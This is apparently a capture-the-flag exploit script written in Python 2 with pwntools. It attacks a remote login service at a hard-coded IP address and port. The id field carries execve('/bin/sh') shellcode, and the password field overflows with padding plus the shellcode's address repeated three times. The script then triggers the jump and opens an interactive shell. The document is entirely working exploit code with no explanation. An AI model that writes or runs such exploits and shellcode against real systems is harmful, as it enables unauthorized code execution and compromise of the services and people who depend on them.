from pwn import *

p = remote("54.180.60.212", 1001)

def login(id_,password):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(id_))
	print p.sendlineafter(":",str(password))

id_addr = 0x601120

shellcode = "\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shell_addr = id_addr + 6

id_val = "admin" + shellcode
password = "admin!AA" # padding
password += p64(shell_addr) * 3

print hex(shell_addr)
login(id_val, password)

p.sendlineafter(">", "-6")
p.interactive()